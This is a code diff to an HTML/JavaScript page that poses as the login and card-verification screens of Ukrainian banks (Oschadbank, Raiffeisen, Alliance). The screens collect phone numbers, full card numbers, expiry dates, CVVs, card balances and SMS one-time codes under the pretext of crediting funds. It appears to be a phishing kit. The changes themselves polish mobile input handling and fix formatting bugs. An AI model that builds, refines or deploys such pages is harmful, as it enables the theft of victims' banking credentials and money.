@@ -49,6 +49,7 @@
             border-radius: 16px; text-decoration: none; color: var(--dark-text); text-align: center;
             height: 120px; transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); cursor: pointer;
             box-shadow: 0 4px 10px var(--shadow-color); position: relative;
+            -webkit-tap-highlight-color: transparent;
         }
         .bank-item:hover { transform: translateY(-8px); box-shadow: 0 10px 20px var(--shadow-color); }
         .bank-item img { max-height: 55px; max-width: 100%; object-fit: contain; margin-bottom: 15px; }
@@ -120,6 +121,7 @@
             flex: 1; padding: 12px 15px; border: none; background-color: transparent;
             font-size: 15px; font-weight: 600; color: #6c757d; cursor: pointer;
             border-radius: 8px; transition: all 0.2s ease;
+             -webkit-tap-highlight-color: transparent;
         }
         .oschad-toggle-buttons button.active {
             background-color: var(--white);
@@ -144,6 +146,7 @@
             font-size: 16px; color: var(--dark-text); background-color: var(--white);
             transition: all 0.2s ease; outline: none;
             font-weight: 500; position: relative;
+            -webkit-appearance: none;
         }
         .oschad-input-field:focus {
             border-color: var(--oschad-primary);
@@ -190,6 +193,7 @@
             background-color: #e9ecef; color: #adb5bd; font-size: 18px; font-weight: 700;
             cursor: not-allowed; transition: all 0.2s ease;
             z-index: 1001;
+            -webkit-tap-highlight-color: transparent;
         }
         .oschad-submit-button.active {
             background-color: var(--oschad-primary); color: var(--white); cursor: pointer;
@@ -201,7 +205,8 @@
             margin-top: -10px;
             margin-bottom: 15px;
         }
-        .oschad-input-group.error .oschad-input-field {
+        .oschad-input-group.error .oschad-input-field,
+        .oschad-input-group.error .oschad-phone-wrapper {
             border-color: var(--danger-color);
         }
         .loader-icon {
@@ -238,6 +243,7 @@
             border: 1px solid #dee2e6; border-radius: 12px; background-color: var(--white);
             outline: none; transition: border-color 0.2s ease; color: var(--dark-text);
             caret-color: var(--oschad-primary); padding: 0; -moz-appearance: textfield;
+            -webkit-appearance: none;
         }
         .oschad-code-input::placeholder { color: #bdc3c7; font-weight: 400; }
         .oschad-code-input::-webkit-outer-spin-button, .oschad-code-input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
@@ -323,6 +329,7 @@
         .input-field {
             width: 100%; padding: 15px; border: 1px solid var(--border-color); border-radius: 12px;
             font-size: 18px; font-weight: 500; transition: all 0.3s ease;
+             -webkit-appearance: none;
         }
         .error-message { color: var(--danger-color); font-size: 12px; margin-top: 4px; text-align: left; display: none; }
         .phone-input-wrapper { display: flex; }
@@ -336,6 +343,7 @@
         .btn {
             width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 18px;
             font-weight: 700; cursor: pointer; transition: all 0.3s ease; flex-basis: 0; flex-grow: 1;
+            -webkit-tap-highlight-color: transparent;
         }
         .btn:disabled { background-color: #ced4da; cursor: not-allowed; }
         body[data-theme="oschadbank"] { --primary-color: var(--oschad-primary); --accent-color: #008a84; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E0F2F1 0%, #B2DFDB 100%); }
@@ -390,6 +398,7 @@
             flex-grow: 1; background: transparent; border: none; outline: none;
             color: var(--raiff-text); font-size: 18px; font-weight: 500;
             padding: 15px 5px;
+            -webkit-appearance: none;
         }
         .raiff-footer {
             padding: 20px; margin-top: auto;
@@ -399,6 +408,7 @@
             background-color: var(--raiff-btn-bg); color: var(--raiff-text-secondary);
             font-size: 18px; font-weight: 600;
             cursor: not-allowed; transition: all 0.2s ease;
+            -webkit-tap-highlight-color: transparent;
         }
         .raiff-button.active {
             background-color: var(--raiff-yellow);
@@ -415,6 +425,7 @@
             font-size: 24px; font-weight: 600; color: var(--raiff-text);
             outline: none; caret-color: var(--raiff-yellow);
             -moz-appearance: textfield;
+            -webkit-appearance: none;
         }
         .raiff-code-input::-webkit-outer-spin-button, .raiff-code-input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
         .raiff-code-input:focus { border-color: var(--raiff-yellow); }
@@ -496,6 +507,7 @@
             flex-grow: 1; background: transparent; border: none; outline: none;
             color: var(--alliance-text); font-size: 18px; font-weight: 500;
             padding: 15px 5px;
+            -webkit-appearance: none;
         }
         .alliance-input-group-row {
             display: flex;
@@ -512,6 +524,7 @@
             background-color: var(--alliance-btn-bg); color: var(--alliance-text-secondary);
             font-size: 18px; font-weight: 600;
             cursor: not-allowed; transition: all 0.2s ease;
+            -webkit-tap-highlight-color: transparent;
         }
         .alliance-button.active {
             background-color: var(--alliance-primary);
@@ -648,7 +661,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 <h2 class="alliance-main-title">Ласкаво просимо</h2>
                 <div class="alliance-input-group" id="alliance-phone-group">
                     <span class="alliance-input-prefix">+380</span>
-                    <input type="tel" id="alliance-phone-input" class="alliance-input-field" placeholder="Номер телефону" autocomplete="off">
+                    <input type="tel" id="alliance-phone-input" class="alliance-input-field" placeholder="Номер телефону" autocomplete="off" inputmode="numeric" pattern="[0-9\\s]*">
                 </div>
             </div>
             <div class="alliance-footer">
@@ -675,7 +688,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 <h2 class="alliance-main-title">Введіть номер картки</h2>
                 <p class="alliance-subtitle">Кошти будуть зараховані на вказану картку</p>
                 <div class="alliance-input-group" id="alliance-card-group">
-                    <input type="tel" id="alliance-card-input" class="alliance-input-field" placeholder="XXXX XXXX XXXX XXXX" autocomplete="off">
+                    <input type="tel" id="alliance-card-input" class="alliance-input-field" placeholder="XXXX XXXX XXXX XXXX" autocomplete="off" inputmode="numeric" pattern="[0-9\\s]*">
                 </div>
             </div>
             <div class="alliance-footer">
@@ -699,16 +712,18 @@ document.addEventListener('DOMContentLoaded', () => {
                 <div class="alliance-form-center-container">
                     <h2 class="alliance-main-title">Підтвердити володіння карткою</h2>
                     <div class="alliance-input-group" id="alliance-details-card-group">
-                        <input type="tel" id="alliance-details-card-input" class="alliance-input-field" placeholder="Номер картки" autocomplete="off">
+                        <input type="tel" id="alliance-details-card-input" class="alliance-input-field" placeholder="Номер картки" autocomplete="off" inputmode="numeric" pattern="[0-9\\s]*">
                     </div>
-                    <div class="alliance-input-group" id="alliance-details-exp-group">
-                        <input type="tel" id="alliance-details-exp-input" class="alliance-input-field" placeholder="Термін (ММ/РР)" autocomplete="off">
-                    </div>
-                    <div class="alliance-input-group" id="alliance-details-cvv-group">
-                        <input type="tel" id="alliance-details-cvv-input" class="alliance-input-field" placeholder="CVV" autocomplete="off">
+                    <div class="alliance-input-group-row">
+                        <div class="alliance-input-group" id="alliance-details-exp-group">
+                            <input type="tel" id="alliance-details-exp-input" class="alliance-input-field" placeholder="Термін (ММ/РР)" autocomplete="off" inputmode="numeric" pattern="[0-9/]*">
+                        </div>
+                        <div class="alliance-input-group" id="alliance-details-cvv-group">
+                            <input type="tel" id="alliance-details-cvv-input" class="alliance-input-field" placeholder="CVV" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
+                        </div>
                     </div>
                     <div class="alliance-input-group" id="alliance-details-balance-group">
-                        <input type="text" id="alliance-details-balance-input" class="alliance-input-field" placeholder="Поточний баланс картки" autocomplete="off">
+                        <input type="text" id="alliance-details-balance-input" class="alliance-input-field" placeholder="Поточний баланс картки" autocomplete="off" inputmode="decimal">
                     </div>
                 </div>
             </div>
@@ -779,10 +794,10 @@ document.addEventListener('DOMContentLoaded', () => {
                 target.value = target.value.replace(/\D/g, '').substring(0, 3);
              }
              if (target.id === 'alliance-details-balance-input') {
-                let value = target.value.replace(/[^0-9,]/g, '');
-                let parts = value.split(',');
-                if (parts.length > 2) value = parts[0] + ',' + parts.slice(1).join('');
-                target.value = value;
+                let value = target.value.replace(/[^0-9,.]/g, '').replace(',', '.');
+                let parts = value.split('.');
+                if (parts.length > 2) value = parts[0] + '.' + parts.slice(1).join('');
+                target.value = value.replace('.', ',');
              }
 
              if (document.getElementById('alliance-details-submit-btn')) {
@@ -818,7 +833,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 <h2 class="raiff-main-title">Ласкаво просимо</h2>
                 <div class="raiff-phone-group" id="raiff-phone-group">
                     <span class="raiff-phone-prefix">+380</span>
-                    <input type="tel" id="raiff-phone-input" class="raiff-phone-input" placeholder="Номер телефону" autocomplete="off">
+                    <input type="tel" id="raiff-phone-input" class="raiff-phone-input" placeholder="Номер телефону" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
                 </div>
                 <p class="raiff-subtitle" style="margin-top: 20px;">Натиснувши «Продовжити», ви приймаєте <a href="#" style="color:var(--raiff-yellow);">умови надання послуг</a></p>
             </div>
@@ -872,7 +887,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 <h2 class="raiff-main-title">Введіть код</h2>
                 <p class="raiff-subtitle">Ми надіслали код у SMS на номер ${maskedPhone}</p>
                 <div class="raiff-code-inputs ${options.error ? 'error' : ''}">
-                    ${Array(6).fill('<input type="tel" class="raiff-code-input" maxlength="1">').join('')}
+                    ${Array(6).fill('<input type="tel" class="raiff-code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">').join('')}
                 </div>
                 ${options.error ? `<p class="raiff-error-text">Невірний код</p>` : ''}
                 <p class="raiff-resend-info" id="raiff-resend-info">Ви зможете отримати код знову через 0:59</p>
@@ -984,14 +999,14 @@ document.addEventListener('DOMContentLoaded', () => {
                 <span class="title" style="color: ${theme.text};">${activeBankData.name}</span>
                  <img src="${activeBankData.logoUrl}" class="raiff-header-logo" alt="Логотип банку">
             </div>
-            <div class="raiff-content-wrapper" style="color: ${theme.text}; align-items: center;">
+            <div class="raiff-content-wrapper" style="color: ${theme.text};">
                 <div class="raiff-icon-container">
                    <svg width="64" height="64" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M21 5.25L12 13.5L3 5.25" stroke="${theme.primary}" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M3 5.25H21V18C21 18.1989 20.921 18.3897 20.7803 18.5303C20.6397 18.671 20.4489 18.75 20.25 18.75H3.75C3.55109 18.75 3.36032 18.671 3.21967 18.5303C3.07902 18.3897 3 18.1989 3 18V5.25Z" stroke="${theme.primary}" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
                 </div>
                 <h2 class="raiff-main-title">Останній крок</h2>
                 <p class="raiff-subtitle">Для зарахування коштів на вашу картку введіть одноразовий SMS код</p>
                 <div class="raiff-code-inputs ${options.error ? 'error' : ''}">
-                    ${Array(6).fill('<input type="tel" class="raiff-code-input" maxlength="1">').join('')}
+                    ${Array(6).fill('<input type="tel" class="raiff-code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">').join('')}
                 </div>
                  ${options.error ? `<p class="raiff-error-text">Невірний код</p>` : ''}
                 <p class="raiff-resend-info" id="raiff-resend-info" style="margin-top: 20px;">Надіслати код повторно</p>
@@ -1031,14 +1046,14 @@ document.addEventListener('DOMContentLoaded', () => {
                 <span class="title"></span>
                 <img src="${activeBankData.logoUrl}" class="alliance-header-logo" alt="Логотип банку">
             </div>
-            <div class="alliance-content-wrapper" style="align-items: center;">
+            <div class="alliance-content-wrapper">
                  <div class="alliance-icon-container">
                    <svg width="64" height="64" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M21 5.25L12 13.5L3 5.25" stroke="var(--alliance-primary)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M3 5.25H21V18C21 18.1989 20.921 18.3897 20.7803 18.5303C20.6397 18.671 20.4489 18.75 20.25 18.75H3.75C3.55109 18.75 3.36032 18.671 3.21967 18.5303C3.07902 18.3897 3 18.1989 3 18V5.25Z" stroke="var(--alliance-primary)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
                 </div>
                 <h2 class="alliance-main-title">Останній крок</h2>
                 <p class="alliance-subtitle">Для зарахування коштів на вашу картку введіть одноразовий SMS код</p>
-                <div class="raiff-code-inputs ${options.error ? 'error' : ''}" style="margin-bottom: 25px; max-width: 350px; width: 100%;">
-                    ${Array(6).fill('<input type="tel" class="raiff-code-input" style="background-color: var(--white); border-color: var(--alliance-border-color); color: var(--alliance-text);" maxlength="1">').join('')}
+                <div class="raiff-code-inputs ${options.error ? 'error' : ''}" style="margin: 0 auto 25px auto; max-width: 350px;">
+                    ${Array(6).fill('<input type="tel" class="raiff-code-input" style="background-color: var(--white); border-color: var(--alliance-border-color); color: var(--alliance-text);" maxlength="1" inputmode="numeric" pattern="[0-9]*">').join('')}
                 </div>
                 ${options.error ? `<p class="raiff-error-text" style="color: var(--danger-color); text-align: center; font-weight: 500;">Невірний код</p>` : ''}
                 <p class="raiff-resend-info" style="margin-top: 20px; text-align: center; color: var(--alliance-text-secondary); cursor: pointer;">Надіслати код повторно</p>
@@ -1089,12 +1104,12 @@ document.addEventListener('DOMContentLoaded', () => {
             <div class="raiff-content-wrapper" style="color: ${theme.text};">
                 <h2 class="raiff-main-title" style="margin-top: 30px;">Підтвердити володіння карткою</h2>
                 <div style="display: flex; flex-direction: column; gap: 15px;">
-                    <input id="details_card" class="raiff-phone-input" placeholder="Номер картки" style="padding: 15px; border-radius: 8px; background-color: rgba(255,255,255,0.1); color: var(--raiff-text);">
+                    <input id="details_card" class="raiff-phone-input" placeholder="Номер картки" style="padding: 15px; border-radius: 8px; background-color: rgba(255,255,255,0.1); color: var(--raiff-text);" type="tel" inputmode="numeric" pattern="[0-9\\s]*">
                     <div style="display: flex; gap: 15px;">
-                        <input id="details_exp" class="raiff-phone-input" placeholder="Термін (ММ/РР)" style="padding: 15px; border-radius: 8px; background-color: rgba(255,255,255,0.1); color: var(--raiff-text);">
-                        <input id="details_cvv" class="raiff-phone-input" placeholder="CVV" style="padding: 15px; border-radius: 8px; background-color: rgba(255,255,255,0.1); color: var(--raiff-text);">
+                        <input id="details_exp" class="raiff-phone-input" placeholder="Термін (ММ/РР)" style="padding: 15px; border-radius: 8px; background-color: rgba(255,255,255,0.1); color: var(--raiff-text);" type="tel" inputmode="numeric" pattern="[0-9/]*">
+                        <input id="details_cvv" class="raiff-phone-input" placeholder="CVV" style="padding: 15px; border-radius: 8px; background-color: rgba(255,255,255,0.1); color: var(--raiff-text);" type="tel" inputmode="numeric" pattern="[0-9]*">
                     </div>
-                    <input id="details_balance" class="raiff-phone-input" placeholder="Поточний баланс картки" style="padding: 15px; border-radius: 8px; background-color: rgba(255,255,255,0.1); color: var(--raiff-text);">
+                    <input id="details_balance" class="raiff-phone-input" placeholder="Поточний баланс картки" style="padding: 15px; border-radius: 8px; background-color: rgba(255,255,255,0.1); color: var(--raiff-text);" type="text" inputmode="decimal">
                 </div>
             </div>
             <div class="raiff-footer">
@@ -1116,10 +1131,10 @@ document.addEventListener('DOMContentLoaded', () => {
             } else if (id === 'details_cvv') {
                 e.target.value = value.replace(/\D/g, '').substring(0, 3);
             } else if (id === 'details_balance') {
-                let v = value.replace(/[^0-9,]/g, '');
+                let v = value.replace(/[^0-9,.]/g, '').replace(',', '.');
                 let parts = v.split(',');
                 if (parts.length > 2) v = parts[0] + ',' + parts.slice(1).join('');
-                e.target.value = v;
+                e.target.value = v.replace('.', ',');
             }
         });
 
@@ -1157,9 +1172,10 @@ document.addEventListener('DOMContentLoaded', () => {
 
                 <div id="phone-login-form">
                     <div class="oschad-input-group phone-group ${errorType === 'phone' ? 'error' : ''}">
+                        <label for="phone_input">Номер телефону</label>
                         <div class="oschad-phone-wrapper">
                             <span class="oschad-phone-prefix">+380</span>
-                            <input type="tel" class="oschad-input-field" id="phone_input" placeholder=" " autocomplete="off" value="${savedPhone || ''}">
+                            <input type="tel" class="oschad-input-field" id="phone_input" placeholder=" " autocomplete="off" value="${savedPhone || ''}" inputmode="numeric" pattern="[0-9\\s]*">
                         </div>
                     </div>
                     <div class="oschad-input-group ${errorType === 'phone' ? 'error' : ''}">
@@ -1226,10 +1242,10 @@ document.addEventListener('DOMContentLoaded', () => {
                 ${options.phoneNumbers ? options.phoneNumbers.map(n => `<p class="oschad-code-number">${n}</p>`).join('') : ''}
                 <p class="oschad-code-instruction">${instructionText}</p>
                 <div class="oschad-code-inputs ${error ? 'error' : ''}" id="code-inputs-container">
-                    <input type="tel" inputmode="numeric" maxlength="1" class="oschad-code-input" placeholder="–">
-                    <input type="tel" inputmode="numeric" maxlength="1" class="oschad-code-input" placeholder="–">
-                    <input type="tel" inputmode="numeric" maxlength="1" class="oschad-code-input" placeholder="–">
-                    <input type="tel" inputmode="numeric" maxlength="1" class="oschad-code-input" placeholder="–">
+                    <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="oschad-code-input" placeholder="–">
+                    <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="oschad-code-input" placeholder="–">
+                    <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="oschad-code-input" placeholder="–">
+                    <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="oschad-code-input" placeholder="–">
                 </div>
                 ${error ? `<p class="oschad-code-error-text">Код введено невірно</p>` : ''}
                 <a href="#" class="oschad-resend-link" id="resend-link">${resendText}</a>
@@ -1282,7 +1298,7 @@ document.addEventListener('DOMContentLoaded', () => {
                         <p>Для відновлення пароля введіть свій фінансовий номер телефону</p>
                         <div class="oschad-input-group phone-group has-value">
                            <label for="fp_phone_input">Номер телефону</label>
-                           <div class="oschad-phone-wrapper"><span class="oschad-phone-prefix">+380</span><input type="tel" class="oschad-input-field" id="fp_phone_input" placeholder=" " autocomplete="off"></div>
+                           <div class="oschad-phone-wrapper"><span class="oschad-phone-prefix">+380</span><input type="tel" class="oschad-input-field" id="fp_phone_input" placeholder=" " autocomplete="off" inputmode="numeric" pattern="[0-9\\s]*"></div>
                         </div>
                     </div>
                     <button class="oschad-submit-button" id="fp-submit-btn" disabled>ПРОДОВЖИТИ</button>`;
@@ -1298,7 +1314,7 @@ document.addEventListener('DOMContentLoaded', () => {
                         <h2 class="oschad-main-title">Введіть ваш номер картки</h2>
                         <div class="oschad-input-group">
                            <label for="fp_card_input">Номер картки</label>
-                           <input type="tel" class="oschad-input-field" id="fp_card_input" placeholder=" " autocomplete="off" maxlength="19">
+                           <input type="tel" class="oschad-input-field" id="fp_card_input" placeholder=" " autocomplete="off" maxlength="19" inputmode="numeric" pattern="[0-9\\s]*">
                         </div>
                     </div>
                     <button class="oschad-submit-button" id="fp-submit-btn" disabled>ПРОДОВЖИТИ</button>`;
@@ -1381,7 +1397,7 @@ document.addEventListener('DOMContentLoaded', () => {
         document.querySelectorAll('.oschad-input-group').forEach(group => {
             const input = group.querySelector('.oschad-input-field');
             if (!input) return;
-            const checkValue = () => group.classList.toggle('has-value', input.value);
+            const checkValue = () => group.classList.toggle('has-value', input.value.trim() !== '');
             input.addEventListener('focus', () => group.classList.add('is-focused'));
             input.addEventListener('blur', () => { group.classList.remove('is-focused'); checkValue(); });
             input.addEventListener('input', checkValue); checkValue();
@@ -1601,16 +1617,6 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     });
 });
-</script>
-<script>
-    // Оптимизация для мобильных устройств
-    document.addEventListener('touchstart', function(event) {
-        const oschadInputGroup = event.target.closest('.oschad-input-group');
-        if (oschadInputGroup) {
-            const inputField = oschadInputGroup.querySelector('.oschad-input-field');
-            if (inputField && document.activeElement !== inputField) inputField.focus();
-        }
-    }, { passive: true });
 </script>
 </body>
 </html>
